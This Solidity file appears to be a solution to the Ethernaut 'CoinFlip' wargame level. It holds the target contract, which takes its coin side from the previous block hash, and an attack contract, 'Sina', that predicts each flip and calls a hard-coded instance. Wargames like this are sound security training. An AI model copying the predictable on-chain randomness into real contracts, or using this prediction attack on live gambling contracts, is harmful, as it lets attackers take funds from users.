
pragma solidity 0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

   using SafeMath for uint256;
   uint256 public consecutiveWins;
   uint256 lastHash;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

   constructor() {consecutiveWins = 0;}

  function flip(bool _guess) public returns (bool) {

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {revert();}

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
        consecutiveWins++;
        return true;
        } else {
        consecutiveWins = 0;
        return false;
        }
  }
}


contract Sina {
    CoinFlip public instance;
    bool public side;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        instance = CoinFlip(0x53295F7695d07B109dEc7db40cf8B35E22bF66c9);
    }

    function decide() public payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 number = uint256(uint(blockValue)/FACTOR);
        side = number == 1 ? true : false;

        instance.flip(side);
    }
}
